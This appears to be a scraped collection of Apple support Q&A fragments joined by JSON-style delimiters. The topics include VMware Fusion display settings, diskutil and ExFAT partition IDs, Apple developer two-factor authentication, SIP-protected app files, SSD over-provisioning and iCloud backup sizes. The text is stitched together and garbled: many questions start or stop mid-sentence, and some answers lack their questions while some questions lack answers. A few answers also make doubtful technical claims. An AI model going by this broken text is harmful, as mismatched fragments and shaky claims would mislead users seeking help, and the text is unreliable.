\\;\n\nOn the Mac you get into single user mode by holding down command-s when you poweron your machine.

IT-support installed VMWare Fusion but I can't expand the VMware Fusion window to the full width of my laptop. It's really frustrating. Any ideas on how to fix? \nI saw this for Ubuntu but that's not my OS. \n\nAdditionally - is there a setting to enable my windows VM to run full screen on macOS Mojave?\n\nA: You need to install VMware tools inside the Windows virtual machine to be to resize the resolution of the virtual machine from the host. That will enable you to resize the window to fit the width of your display, as well as being able to enable \"Resize to Fit\" so that when you resize the size of the window, the virtual display resolution within the virtual machine changes as well.\nYou can install VMware Tools by opening the menu titled \"Virtual Machine\" and choosing \"Install VMware Tools\".\nWithout VMware Tools you'll need to change the resolution of the virtual machine from within the virtual machine itself. On Windows you'll often be able to do so by right-clicking the Desktop and selecting Properties, and then select a display resolution that matches the width of your display. It is not that convenient.\nIf you want to run the virtual machine in full screen, i.e. not in a window, you can do so by opening the menu titled \"View\" and choosing \"Full Screen\".

I don't get a solution using iTunes.\nI have to say that there are a ton of files and i don't want to have copies in the iTunes.\n\nA: There are various ways this can be accomplished. A simple solution would be use a online file sharing service such as Dropbox, Google Drive, Box etc. Simply install the chosen app on your Android device and backup files using chosen service.\nThis should be straightforward as Android allows file system access in general and there are various 3rd party apps which will allow you to browse the device filesystem.\nOnce the files are synced (uploaded to the cloud services's server), simply install the iOS counterpart of the same app and access the files. You will not automatically get access to the audio files in your iOS device. However, depending on the container format of the audio files, you may be able to playback them in the cloud service app itself (Dropbox, Google Drive, Box etc.).\nHowever, the most likely case is that you indeed wish to playback the audio files on your iOS device. In that case, it would be advisable to install VLC for Mobile app for iOS and copy over the files using file sharing feature build into iTunes for desktop.\nFor the aforementioned, you'll need access to a desktop computer. Simply connect your Android device to the computer and copy over the audio files to your computer. Now install iTunes desktop app and connect your iOS device. Make sure you have already installed VLC for Mobile app for iOS. Now select your device within iTunes, select file sharing in the sidebar, click on VLC and drag & drop to copy over the audio files.\nThis will effectively copy the files into your iOS device. However, the files will be accessible only within VLC for Mobile app. However, it's highly likely that you'll be able to playback them as VLC for Mobile app supports a vast variety of formats.\n", "Q: iMessage appears to be blocked, but FaceTime rings Something confusing happened on my iPad today. One of my contacts' number has been red instead of blue in iMessage for sometime now. I cannot send them a text through iMessage. The send button isn't even active with their number. I know that typically means I am blocked or their number is no longer associated with their Apple ID.\nHowever, today I decided to try FaceTime on that number. It rang more than 6 times. There was no answer. But why would it ring if the number doesn't work with iMessage?\n\nA: The reason is because the person your are messaging turned off their Apple ID from iMessage. You’re iPad is trying to send a text message but because you’re not on an iPhone it can’t.\nFaceTime was ringing because the person didn’t turn off FaceTime but only iMessage.\n", "Q: How can I stop the prompt \"Do you want Microsoft Office to automatically update?\" I am one of the users on a multi-user version of Office365.

And then I launched Disk Utility.app. It shows me USB External Physical Volume • ExFAT. I am not going to paste the screenshot, but this is what it displays. This is very weird. \nHow to tell the true file system type? Thanks. \nBtw, I know I can reformat it with Disk Utility.app, but I just want to know the current type in this question. Thanks a lot. \n\nA: There is no mystery here. The volume is ExFAT formatted.\nThe drive is using the legacy Master Boot Record (MBR) partition scheme. The diskutil command displays the TYPE based on the single byte partition id. In your case, the partition id is a hexadecimal value of 07. The diskutil has this hardcoded to the string Windows_NTFS. This partition id is also used for Microsoft's ExFAT format and IBM's HPFS format. The Disk Utility application actually looks at the contents of the volume to determine the format.\nYou can get the partition id by entering the command fdisk /dev/disk1. A list of MBR partition id's can be found here.\nThe diskutil command does know the partition is ExFAT formatted. If you enter the command diskutil info /dev/disk1s1, you can see for yourself. The diskutil list /dev/disk1 command displayed the Partition Type, while the Disk Utility application displayed the Name (User Visible).\nExample\nBelow is the diskutil list /dev/disk3 output for a small mounted file named exfat.dmg.\n/dev/disk3 (disk image):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:     FDisk_partition_scheme                        +100.0 MB   disk3\n   1:               Windows_NTFS myexfat                 100.0 MB   disk3s1\n\nBelow is what is shown by the Disk Utility application.\n\nThe output from fdisk /dev/disk3 shows the partition id as 07.\nDisk: /dev/disk3    geometry: 775/4/63 [195376 sectors]\nSignature: 0xAA55\n         Starting       Ending\n #: id  cyl  hd sec -  cyl  hd sec [     start -       size]\n------------------------------------------------------------------------\n 1: 07 1023 254  63 - 1023 254  63 [         1 -     195375] HPFS/QNX/AUX\n 2: 00    0   0   0 -    0   0   0 [         0 -          0] unused      \n 3: 00    0   0   0 -    0   0   0 [         0 -          0] unused      \n 4: 00    0   0   0 -    0   0   0 [         0 -          0] unused      \n\nThe output from the command diskutil info /dev/disk3s1 is shown below.\n   Device Identifier:        disk3s1\n   Device Node:              /dev/disk3s1\n   Whole:                    No\n   Part of Whole:            disk3\n\n   Volume Name:              myexfat\n   Mounted:                  Yes\n   Mount Point:              /Volumes/myexfat\n\n   Partition Type:           Windows_NTFS\n   File System Personality:  ExFAT\n   Type (Bundle):            exfat\n   Name (User Visible):      ExFAT\n\n   OS Can Be Installed:      No\n   Media Type:               Generic\n   Protocol:                 Disk Image\n   SMART Status:             Not Supported\n   Volume UUID:              EE0D02D3-C2F6-3230-B97D-17C9C3AD7724\n   Partition Offset:         512 Bytes (1 512-Byte-Device-Blocks)\n\n   Disk Size:                100.0 MB (100032000 Bytes) (exactly 195375 512-Byte-Units)\n   Device Block Size:        512 Bytes\n\n   Volume Total Space:       99.8 MB (99831808 Bytes) (exactly 194984 512-Byte-Units)\n   Volume Used Space:        24.6 KB (24576 Bytes) (exactly 48 512-Byte-Units) (0.0%)\n   Volume Free Space:        99.8 MB (99807232 Bytes) (exactly 194936 512-Byte-Units) (100.0%)\n   Allocation Block Size:    4096 Bytes\n\n   Read-Only Media:          No\n   Read-Only Volume:         No\n\n   Device Location:          External\n   Removable Media:          Removable\n   Media Removal:            Software-Activated\n\nI am using macOS High Sierra version 10.13.6.\n", "Q: ios defaulting to music in control centre I was wondering if there was a way to prevent the control centre from defaulting to music.\nI listen to a lot of podcasts and I’ve tried various apps including Apple Podcasts to see if the following problem can be remedied but nothing works.\nI often find that after pausing a podcast I return to the control centre and it has defaulted to music when I go to tap play.

Ideally I would like the icons to be removed automatically on start-up too.\nThanks :)\n\nA: The Finder in MacOS is 'always on'. There is no need to Launch it in normal operation, so having it in Launchpad is fruitless. Any app currently running will normally appear in the Dock: so the Finder, being always on, will always be in the Dock.\nThe Dock provides functionality as follows: by right clicking on the Finder's icon, you can bring to the foreground any open Finder window, and perform other tasks like creating a new window or connecting to a server. You can also control whether the Finder is linked to a particular display or Desktop space. \nRight-clicking will also show if the Application is Not Responding, in the event of a problem, and is a useful troubleshooting technique. (Admittedly, there are other methods of performing all these functions, but the Dock is arguably the easiest.)\nSimilarly, the Trash icon is only to be found in the Dock. You can of course send files and folder to the Trash with a key command, but the only way of dragging a file to the Trash is onto the Dock. Clicking on the Trash icon is the easiest way of opening the Trash to recover trashed files. You could not drag a file from a Finder window into the Trash within LaunchPad.\nThere is always a compromise to be struck between \"ways I'd like to do things\" and \"ways that the OS is designed to do things\". Sometimes it's possible and desirable to modify the defaults; and sometimes it's not possible (without making significant alterations that may cause unforeseen difficulties, limitations or even 'damage' to the OS).\nCustomisations to Apple's System files are possible, but require regular maintenance to ensure that new system updates have not restored Apple's original data, or changed things so that the customisation no longer works or even causes problems.\n", "Q: Apple's new 2FA requirement for developer Apple IDs According to various reports, Apple is imminently going to force developers to use 2FA with their Apple IDs, but it’s not easy to understand exactly how Apple’s implementation will work.\nPlease don’t waste time criticizing my use case requirements below. I work in and on data security tools and I know my requirements are unusual. Apologies in advance for the length, but I want to spell out everything and see if others can help fill me in on what is possible, or potentially what is impossible. I’d rather give as much info as possible right from the beginning. If more info is needed, please ask.\nI have several iOS devices, none of which have “data”. Imagine that they are all iPads or iPod touches. They access the internet via Wi-Fi over VPN. Apple’s support document seems to say that you can manage their 2FA without data, but they seem to assume that you have SMS available or at least an active phone number — and that you’re okay giving it to them.\n\n\n*\n\n*I don’t use SMS. At all. Yes, really. It’s not secure in any way, shape or form, it certainly shouldn’t be a part of a security system. In fact, I don’t own a cell phone right now, and I don’t have regular access to a land line anymore, or at least not when I’m working. So when Apple speaks of a “trusted phone”, that’s not applicable to me during most of my development hours.\nIf it was purely a one-off SMS verification sent, then one could simply buy a burner SIM, or even ask a friend (bad idea), but if a phone# gets entered into Apple’s 2FA system, I think we can presume that number will be needed on an ongoing basis, even if infrequently.  I’m not going to back myself into an unrecoverable corner.\n\n*I do not (will not) use iCloud. I don’t store any data in the cloud on servers owned by others, not even Apple. If this new 2FA requirement means that one cannot develop iOS apps and install on their own iDevices without having an iCloud account, that’s very troubling. Hopefully someone can confirm or deny this with certainty.\nThe article: Get a verification code and sign in with two-factor authentication, seems to imply that one does not need iCloud, and you can get a Verification Code while offline, which I've done on my iDevice, but I have no way to test it, because I don't know how it integrates into Xcode.\n\n*It doesn’t look like 2FA options that are actually relatively secure, like Yubikey, are available. Any info on this?\n\n*Is this new 2FA requirement only for devs with published apps? Or will it affect the ability of those of us who write internal (not enterprise scope) apps to install on our own devices? The Apple ID email associated with this developer account has not received any email about this, the only way I knew is because it’s being discussed on various forums.\n\n*When does a 2FA request kick in? If it’s triggered based on a new IP address that’s a problem. When my iOS devices connect to the Internet (infrequently) it’s always via VPN, so different public IP addresses all the time. My development laptop is usually fully disconnected from the public Internet, but when it is connected it will have a variety of IP addresses as well, though not necessarily via VPN. If 2FA is triggered based on some attribute of each device, then how is that stored/determined? I never allow my browsers to use local data storage, I don’t allow cookies except momentarily to sign into one of a couple sites, like https://appleid.apple.com/; then they’re deleted immediately.\n\n*Xcode on my development laptop does get to talk to the Internet, but only to a few of Apple’s developer servers, and only when I need to update the provisioning certificate. If there’s a short lapse I can usually live with that because of the iOS simulator. So less than once/week on average.\n\n*Like many devs, I use a personal Apple ID for my personal device/apps/music, but a different Apple ID for development. From what I’ve read, this 2FA requirement is going to be a huge PITA for many developers. Is there an easy way to deal with this? I’ve just updated one of our older devices to iOS 12 (didn’t want to, but this 2FA move kind of forced the issue), linked it to my developer AppleID. While this device is fully offline, I can go into Settings → AppleID → Password & Security to generate a “Verification Code”. If that’s all I need for this process, I’ll usually be okay, because I can try to keep that device with me at all times, even if it’s not particularly convenient.\nSo there are a several questions above that I’m looking for answers, but one more self-contained question is this: With the above constraints, will I be able to continue to use Xcode on my laptop and push apps to our own devices?  If Xcode simply chokes when I request an updated provisioning certificate and I can generate an associated Verification Code on my offline mobile device, that’s not a problem. But I don’t see how I can even enable their terrible notion of 2FA on the laptop. Not that I want it anyway, my own security systems are better right now, so it will merely be an inconvenience at best, and if SMS is a hard requirement, then it would be a downgrade. For me anyway.\nAn aside; you might wonder how one can get any work done with my setup, but it’s not that bad, I only need to connect my dev laptop to the internet about once/week or so to reload provisioning certificates. The iDevices only need to connect to the open internet (via VPN) when Xcode is actually pushing the apps onto them.\nAnother reference, this post:\nAbility to add non-SMS 2-factor auth to an Apple ID?\nlinks to an Apple Support page that says SMS is required, but that’s for 2-step verification, not 2-factor authentication.\nThere are so many different related questions and articles, but they all seem incomplete and/or in conflict with each other.\n\nA: The new 2FA requirement is not concerning a new 2FA system - it is the same 2FA system that Apple ID users have had available for a very long time now. You can find tons of guides and information about this on the net.\nYou seem to be asking many different questions all revolving around the same theme. Therefore I will give you a general answer, but if you want specifics about each sub question then ask it as its own question.\nYes, you can use 2FA without using iCloud Drive, without syncing with iCloud Photos, without using iCloud mail, etc. You need nothing more than the Apple ID you already have.\nYes, you do need a working phone number. It does not have to be SMS, as you can request a voice message instead.\nNo, you will not need to use this method regularly. It is intended only for when you have forgotten your password or want to do account recovery.\nYes, 2FA devices work perfectly well offline. You are not suddenly requires to be online all the time. If you want to interact with Apples servers for downloading provisioning profiles you’ll need to be online, but that has always been the case.\nNo, you’re not going to be generating and entering 2FA codes all the time. You do this once per “system” and a token is stored that means you won’t have to do it again on that system until you change your password or otherwise revoke the token. A system could be a browser, Xcode or whatever you use to talk with Apple’s systems.\nNo, you cannot use Yubikeys or similar. You can use Apple devices such as for example a phone with a Secure Enclave. It is the same principles as the Yubikey using TOTP with a secret stored in the Secure Enclave.\nThe 2FA request is not initiated when you connect to the internet. It is only when you specifically tries to access something on Apple’s system without having a pre-stored token. Yes, you can use 2FA even though you’re connecting over VPN.\nNo, it doesn’t matter if you have published apps or not. It is a generic requirements for members of the developer program. You’ll know if you’re affected because Apple send you a direct email about this.\nYes, you can use your developer 2FA on a “private” device without having to remove your private 2FA account from the device.\n", "Q: Macos Kernel Extension whitelisting issues Trying to whitelist a kernel extension for an agent I'm trying to install.

suspect there's a correlation.  I've tried repairing permissions without success.  About the only thing I didn't do is try this on another Mac which I may try as well.  I've also tried using a .plist file that only includes configurations for bundle ID's or Team ID's respectively (not combined as in above) without success.\nThe worst part is that I'm having difficulties troubleshooting the issue.  I just don't understand the underlying mechanisms very well so I'm open to troubleshooting tips.  It may also be that there's something wrong with my .plist code but I'm just not seeing it.  Very open to suggestions there as well.  It seems like my test machine is trying to commit the settings, but it's just not working.\nAnother thing: I noticed errors related to the file \"DetachedSignatures\" in the logs as well and copied a file from another machine onto the test one in the /var/db (I think) folder and the errors went away.  No idea if they're related.\nAs you can tell, I'm sorta grasping at straws here.  Hoping and praying the moderator Gods are kind to me and allow me to keep this post active so I can get help.  Thank you so much in advance for reading this and hopefully with your help, I can get beyond this.  It's probably something silly I'm missing.\n\nA: Alrighty, I'm going to update this post with what I've learned.  First, I wasn't able to solve the original problem and have had more than a couple of other seasoned experts help me try without success.  I'm super grateful to them for their help.  Along the way though, I discovered that the most recent versions of Apple Server, which is only compat with 10.13 and 10.14, contains a version of profile manager that includes built-in kernel extension settings.  They work flawlessly.\nAnother thing: the script shown above is not a valid script to know whether the enforcing mobileconfig policy is truly allowing the team IDs it is configured to allow, so that was a bad test.  I don't know what would be better.  All I know is that prior to changing the built-in setting in PM, it wasn't working.  After changing that setting, it worked perfectly.\nFinally, I was pushing policies by downloading them and installing them manually on the computer, which apparently is not going to work at all for Kernel Extensions.\nJust sharing what little I know about this so that some poor schmuck out there doesn't have to endure the ordeal I went through.\n", "Q: Even as admin, I cannot edit DefaultFonts.plist for Notes.app. What am I doing wrong? I want to modify DefaultFonts.plist for the Notes application. I've tried a few different ways since what worked on old OS doesn't on 10.14 Mojave:\n\n\n*\n\n*I've navigated to the file through finder, went to Get Info, unlocked the file (via the lock icon), and tried to change permissions. \n\n\nI get the message \"The operation can’t be completed because you don’t have the necessary permission.\"\nI've tried this command:\nchmod 777 /Applications/Notes.app/Contents/Resources/en.lproj/DefaultFonts.plist\nI get the message: Operation note permitted\nI've also tried:\nsudo nano /Applications/Notes.app/Contents/Resources/en.lproj/DefaultFonts.plist\nI'm able to get into the editor, but when I try to save I get message: \"error writing /Applications/Notes.app/Contents/Resources/en.lproj/DefaultFonts.plist\"\nalso, I cannot cd to /Applications/Notes.app/Contents/Resources/en.lproj. (And I cannot see Notes.app when I'm in the Applications folder.)\nThe application is closed while I'm doing all this.\nI have admin permissions on my computer. What in the world am I doing wrong here?\nUPDATE: I'm now able to edit the file thanks to @bmike. However, changing the font size values in the file doesn't seem to affect the application. I think I have the correct file. (btw, not sure if I should be writing this follow-up here or just in comments...or creating a new post. Feedback welcome.) Created new post to address this: Notes.app reverts back to default font when using bulleted list\n\nA: Several of Apple's bundled applications are protected by SIP (System Integrity Protection). As a result, they cannot be modified, even with root privileges. The -lO flag for ls will show you if a file or folder has restricted status:\nls -lO /Applications/Notes.app/Contents/Resources/en.lproj/DefaultFonts.plist\n-rw-r--r--  1 root  wheel  restricted,compressed 538 Aug 20  2018 /Applications/Notes.app/Contents/Resources/en.lproj/DefaultFonts.plist\n\nIf you want to proceed, you'll have to disable SIP, make the modifications, and then consider re-enabling SIP. (I strongly recommend not leaving it off, as it provides valuable security for your Mac against malware and other issues like inadvertent destruction of system critical files.)\nIf you don't like Apple's procedure for disabling SIP, You'll find many webpages explaining how to disable SIP. Here's one.\n\n\n*\n\n*https://support.apple.com/en-us/HT204899\nHowever, it's possible that altering the app directly may compromise its code-signed status. (Again, a security feature designed to stop apps from running if they've been modified.) You may need to look for another way of changing the font in Notes.\n", "Q: How can I repair my Mac so Time Machine backup will work? I'm trying to backup my computer for the first time running Yosemite OS.  The time machine fails, despite trying with two different external USB 3 drives with this error partway into the Time Machine backup and then giving up on the whole backup:\n\nTime Machine couldn’t complete the backup to “Backup”.\n\nAn error occurred while copying files. The problem may be temporary. If the problem persists, use Disk Utility to repair your backup disk.\n\n\nUsing Disk Utility finds no errors to repair.\nI tried to manually copy the files in /home/Username to the backup using the finder and it failed partway through on a .dng image of around 30 MB in size, for which I did not capture the full error message.  \nI then tried to do the folders it had not yet gotten to in the above failure and got a second error:\n\nThe operation can’t be completed because an unexpected error occurred (error code -8084).\n\nAccording to this page, it would be due to a file over 4GB and my partition format not accepting that. However, the disk is partitioned using Mac OS Extended (Journaled).  Note the disk itself uses GUID Partition Map.\nI'm guessing that the issue is not the USB drive, but something physically wrong with my MacBook Air from early 2011.  When I took it to Genius bar, they ran diagnostics and found nothing wrong with computer except need to replace the battery that showed as exhausted.  Other problems with Mac are the trackpad does not detect clicks most of the time, but tracks mouse moves and the wireless connection drops often despite a strong signal from the wireless access point.\nHow can I successfully backup my files?

I let a colleague borrow it for some work, and they did some weird things with it, but it looked ok when I shut it down yesterday. When I tried to boot it up this morning, it did not load my admin profile for me to log in to, but after about a minute a picture of a file folder with a question mark appeared and was blinking on the screen.\nAfter rebooting it several times and then trying safe mode with the same results, I tried to start it in recovery mode with cmd-R (and eventually three other key combinations for recovery mode, but it would only start in internet recovery mode).

If this is disabled (and you didn't disable it) I'd be concerned.\nI hope you have a fairly recent backup in case.\n", "Q: How to permanently disable app relaunch and window restore in Mojave on reboot?

I have a 2017 15\" MacBook Pro with a built-in 1TB SSD.\nAs I understand, with SSDs, the best practice is to leave a portion of them free as an \"over provision\". \nDo I need to do this with the built-in SSD in the MacBook Pro? or has Apple already accounted for this in giving me 1TB of space? e.g. There is actually something like 1.1TB of space, but the firmware keeps that additional 0.1TB free as an over provision.\n\nA: No.\nOver-provisioning is transparent to the user, and done at the factory. SSDs normally have more size than can actually be used. Over-provisioning is not something that the user needs to do.\nHaving said that, SSDs still need to maintain spare space within the volume, in order to have some space to accommodate working files. Between 10 and 15% is usually recommended. Some say as much as 25%.\n\nA: If you're running Mojave or Catalina with an APFS partition, don't even worry about it. \nIt's always better to have an SSD with free space on it, but where you get into trouble is by writing constantly to a full drive.\nHere's why: An SSD has a number of sectors that store data (generally 512 or 4096 bytes). Each sector can only be erased and written a certain number of times (typically 1,000-10,000). Depending on whether it's a NAND or a NOR-like technology, erasing a sector will clear it to all 0's or all 1's. \"Writing\" a sector of data means flipping some of the bits to the opposite value. You can't erase a sector, flip a bit, then flip it back to what it was...you have to erase the sector completely, then set the bits that should have the opposite value.\nThe OS tries to erase and write evenly across the device (wear-leveling). The more sectors it has to play with, the better.\nmacOS goes a step further with APFS by implementing static and dynamic wear leveling, coordinated with the hardware controller and T2 (see Wikipedia's article on wear leveling). The OS will actually move static data that hasn't changed around the disk so that you don't have a bunch of large, unchanged files sitting on nearly new (low write count) sectors while you churn the \"free\" area of the disk. This means that having a nearly full disk doesn't actually hurt longevity that much.\nWhat you should NOT do is run a frequently changing database or a file that is constantly overwritten on your SSD. Those belong on HDD's (spinning rust drives).\nThe real reason why you shouldn't run your internal disk almost full is because many applications (and the OS) don't handle disk full situations well. It's okay to be close to full, but try to never hit \"0 bytes available.\" macOS will warn you when the boot disk is getting close. Otherwise, don't worry about it too much!\nFor the full story, see Wikipedia's article on write amplificaton\nUnfortunately this is one of those areas where, if you're on Windows, the story is completely different than if you're on macOS, so the general public's wisdom on the matter is sometimes quite harmful.\nExample: Most anti-virus don't even have signatures for a single piece of Mac malware because Apple already includes XProtect Description of XProtect. It's free, built-in and, Apple updates it almost daily. Unless you're downloading binaries from Tor, pirated software or otherwise risky software, you are extremely unlikely to catch malware on your Mac. When Apple becomes aware of something, they update their signatures and it's generally stopped in its tracks. I only download apps from the App Store, SetApp or from source code I downloaded and built from major repositories. Running an anti-virus on your Mac just slows it down because 99.9% of the signatures are only for PC/Windows software...so, you're compromising performance and memory so that your neighbor running Windows won't catch anything from your Mac; it's highly unlikely that it'll catch malware that affects your Mac...most of them don't even try.\nSo, you did a good thing by posting this question. You should always ask \"But is that advice good for Mac users too?\" rather than paying attention to common wisdom that applies to PC's.\n\nA: As a slight addendum to the answer of @benwiggy it seems that Apple/Samsung reserve slightly more than 7.37% mentioned in their Seagate link - at least on my drive it is 9.5%.\nI have a SM0256F SSD which is reported by Apple as 251GB (not 256GB which would give 7.37%)  \n\nGPT fdisk shows capacity is 233.8 GiB which is the same as 251 GB.\nCommand (? for help): p\nDisk /dev/disk0: 490234752 sectors, 233.8 GiB\nSector size (logical): 512 bytes\nDisk identifier (GUID): D44A6F10-F09B-4FC9-89D4-E8FDE41C24CF\nPartition table holds up to 128 entries\nMain partition table begins at sector 2 and ends at sector 33\nFirst usable sector is 34, last usable sector is 490234718\n\nIf you multiply 490234752 sectors * 512 bytes per sector = 251,000,193,024 bytes which is identical to System Information. \nOver-provisioned percentage is Physical capacity - User capacity) / User capacity and 256 GiB is 2^38 = 274,877,906,944 bytes so my over-provisioned percentage is :\n(274,877,906,944 - 251,000,193,024) / 251,000,193,024 = 9.51%\nFor a 1TiB drive reported as 1000GB (I don't know if it is) it would be \n(2^40 - 1,000,000,000,000) / 1,000,000,000,000 = 9.95%\nIncidentally Kingston recommend 7% - 28% depending on workload.

If I have a limit of free 5GB iCloud, and the Backup Info states: \n\n\n*\n\n*Backup Size: 4.28GB\n\n*Next Backup Size: 1.10GB\n\n\nDoesn't this mean the next backup will be smaller? Therefore, shouldn't it overwrite/delete the existing backup and thus still be within the 5GB limit?\nMy backups keep failing because of lack of space.\n\nA: This means your current backup size on iCloud is 4.28GB.  The next time a backup is done it will add an additional 1.10GB.\n4.28 + 1.10 = 5.38GB.  That will exceed the amount of space you have in iCloud.\nYou can reduce what's being backed-up or buy additional storage space in iCloud.  Check out this answer to a similar question for tips on what you can do.\n\nA: It's true that 4.28 + 1.10 = 5.38,\nand that would make sense if the backups were purely incremental, and data that no longer exist locally was deleted from the incremental backups.\nBut that's not the case.\nI deleted the existing backup manually, and took a new one right away. That reduced the backup size from 2.6 GB to 1.3.\nOne problem is that when you delete an app, it's data is still left in the backup. You can erase that data from the latest backup, and I did that and took a new backup but the total data backed up was still twice what it should be. So a lot of old backed up data is obviously not deleted from iCloud, and I have searched online but haven't found a way to examine what data that is, nor a way to delete it separately from the fresh backup.\nApple has made the whole thing a blur, and there's no documentation.\n", "Q: When using Volatility with a memory image, what is the Kernel version?

Here’s one:\nHow are Apple’s 2FA “tokens” implemented?  If this has been spelled out in Apple’s docs I haven’t found it yet.\nHere’s why I want to know.  I do not use SMS, period.  Mostly for privacy and security reasons.  Apple’s 2FA requires giving Apple a phone# to even begin the process of enabling it.  They’re good enough to allow you to use a landline # as well, so good for them, but I don’t actually maintain any phone# anymore, so this has been a showstopper for me to even get started, hence the unwieldy set of questions in the previous post.\nIf I knew for a fact that a single SMS in the beginning was the only SMS that would ever be sent, then I could just bug someone else to help me out once and that would be the end of it.  From that point on I could use my offline iDevice to generate Verification Codes (right?).  But if other actions I take will trigger add’l SMS authentication codes, that wouldn’t work.\nHence the need to know how a device or browser is understood to be “trusted” and/or how it might lose that trust.\nI can already generate a “Verification Code” on my iDevice that I’ve now associated with the dev appleID, even fully offline, so that seems great.  I have some level of confidence that device will continue to be “trusted” as long as I don’t change the associated appleID.\nBut I have no idea how this works with a laptop that will never have an iCloud account (or even touch iCloud servers), but instead is just an Xcode dev machine.  The dev machine isn’t normally connected to the internet, and when it is, it’s protected by a very tight firewall.  Once every week or so, it’s allowed to connect (via proxy, VPN, or different physical loctaions) to Apple’s provisioning certificate servers to update certificates.  It’s hard to know how or if I can set up this laptop to be a “trusted machine” and maintain that trust.  First, it will have a different IP address nearly every time Apple sees it, but also, once 2FA is enabled for that appleID, are there different actions I might take that might change that trust, like updating Xcode, for example.\nOn very rare occasions, as in maybe 3 or 4 times ever, I’ve signed in via browser to the associated appleID account to set things up and remove a device once.  But cookies are immediately wiped, and I never allow any “local storage” (from any server), so I’m having a hard time understanding whether I would ever have what passes in an ongoing way as a “trusted browser” in Apple’s eyes.  And if it becomes untrusted, when might that trigger an SMS authentication, as opposed to simply generating a Verification Code on my offline iDevice?\n[update]\nI found this SE answer, which addresses part of my question above.\nHow does apple verify my list of trusted devices and browsers?\nIf a browser is only trusted based on a cookie, that's awfully ephemeral.  Many people, if not most, clear cookies on a regular basis.\nStill wondering about what might affect \"trust\" of the machine(s) themselves.\n\nA: A device is trusted if it holds the token string given out by Apple. For browsers this means that the browser has a cookie stored with the string. You're asked when logging in whether or not you want to trust that browser, and that will trigger storing the cookie.\nIf you clear the cookies, then obviously the browser will not be trusted anymore. Just because you have an habit of clearing your cookies on a regular basis, that does not make Apple's choice \"awful\" in any way. Technically cookies are probably the most secure way of storing this possible with standards compliant browsers. At least it is a very strong choice.\nIn order to avoid the browser loosing the trust, simply stop clearing that one specific cookie. There's no point in religiously removing every cooking, if you do not have a purpose for doing that - and especially not if it directly works against you.\nIn regards to SMS messages: You do not need to receive an SMS message in order to add a new trusted device. You can simply use the 2FA code from one trusted device to add a new trusted device. This is handled automatically by the system.\nRegarding the many other questions you have put into your quite broad question: No, updating Xcode won't invalidate the trust. No, having changing IP address won't invalidate the trust.\n", "Q: How to change font size and font for all profiles in terminal?

I'd say you need to be comfortable with the Terminal, but given the question, I'll skip right over it.\nTerminal configuration is stored in a property list file in ~/Library/Preferences/com.apple.Terminal.plist in a binary format.\nEach profile is stored in a dictionary, and has a Font key within it. You want to extract the Font key from a good profile, and copy/paste into all the others. Or, find/replace if you're using an editor with a regex replace. For example, for the Basic profile, I have:\n    <dict>\n    <key>Basic</key>\n    <dict>\n        <key>Font</key>\n        <data>\n        YnBsaXN0MDDUAQIDBAUGGBlYJHZlcnNpb25YJG9iamVjdHNZJGFy\n        Y2hpdmVyVCR0b3ASAAGGoKQHCBESVSRudWxs1AkKCwwNDg8QVk5T\n        U2l6ZVhOU2ZGbGFnc1ZOU05hbWVWJGNsYXNzI0AmAAAAAAAAEBCA\n        AoADXlNGTW9uby1SZWd1bGFy0hMUFRZaJGNsYXNzbmFtZVgkY2xh\n        c3Nlc1ZOU0ZvbnSiFRdYTlNPYmplY3RfEA9OU0tleWVkQXJjaGl2\n        ZXLRGhtUcm9vdIABCBEaIy0yNzxCS1JbYmlydHZ4h4yXoKeqs8XI\n        zQAAAAAAAAEBAAAAAAAAABwAAAAAAAAAAAAAAAAAAADP\n        </data>\n        <key>FontAntialias</key>\n        <true/>\n        <key>FontWidthSpacing</key>\n        <real>1.004032258064516</real>\n        <key>ProfileCurrentVersion</key>\n        <real>2.0600000000000001</real>\n        <key>name</key>\n        <string>Basic</string>\n        <key>type</key>\n        <string>Window Settings</string>\n    </dict>\n\nYou want to copy the whole Font key and data blocks between each of your profiles.\nSteps:\n\n\n*\n\n*Close Terminal.\n\n*Back up your original prefs:\ncp ~/Library/Preferences/com.apple.Terminal.plist ~/Desktop/com.apple.Terminal.plist.bak\n\n\n*Convert your working copy to XML:\ncd ~/Library/Preferences\nplutil -convert xml1 com.apple.Terminal.plist\n\n\n*Edit the file and copy/paste the font data blocks into all the profiles.

Whenever I let it completely loose power, it takes forever to actually turn back on. When I have it plugged in, it will power back on and show the apple logo on the white screen, and then shut back off. It does this a few times (like 5 or 6 times) before actually powering all the way on. Does anyone know what's going on or how to fix it?\n\nA: Unless I'm missing something, this is expected behaviour when your iPad battery is extremely low. Basically, the battery will need a certain amount of charge to allow your iPad to switch on, and a certain amount of charge to effectively boot up. \nIf your iPad mini works fine otherwise, then it's really probably just a case of not letting it get too low before placing it on charge.\nAlso, you need to ensure that you're connecting it to its original charger, or to a charger providing enough current to charge the iPad effectively. In the absence of doing this you may find the iPad takes a lot longer to charge before being able to boot it up again.\nFinally, as you've had your iPad mini for a long time, the battery may have exceeded its expected charge cycle count. When this happens it won't maintain a charge for as long as you're used to and it will take a lot longer before it can reach a state of charge needed to work properly. Eventually, it will die altogether (although if it has enough charge then you can effectively use it while it's connected to a power source - but if it loses that state of charge, then even having it connected to a power source may not suffice).\n", "Q: Restore Backup can this still be done after choosing setup as new? I want to Restore my iPad, I have already created a backup on my Windows 7 PC using iTunes. When I restore my Ipad, as far as I remember from some tutorials online, you will have to choose to restore from iCloud/iTunes or \"As New\" (Something like this). So when I select \"As New\" and later after the restoration, I connect my iPad to my Windows 7 machine with iTunes and choose \"restore iPad\", will it give me back my backup data? Even if I chose \"As New\" above?\n\nA: No, because you set it up as a new device instead of restoring from an \"existing device\".\nTherefore, it will treat it as such, and not move data from your backup to your iPad,\nYou can still move that data over once you're done setting up the iPad, by using the restore button in iTunes. But you will loose the setup and any changes done before the restore. \n", "Q: error \"System Events got an error: Can’t get application process \\\"System Preferences\\\".\" When running \ntell application \"System Events\"\n    click button \"Turn Bluetooth Off\" of window 1 of application process \"System Preferences\"\nend tell\nI get the error:\nerror \"System Events got an error: Can’t get application process \\\"System Preferences\\\".\" number -1728 from application process \"System Preferences”\nI’ve also tried \ntell application \"System Preferences\"\n    reveal pane \"com.apple.preferences.Bluetooth\"\nend tell\ntell application \"System Events\" to tell process \"System Preferences\"\n    click button 6 of window 1\nend tell\nquit application \"System Preferences”\nDidn’t give me any errors, but it didn’t work\nI’m running macOS Sierra.

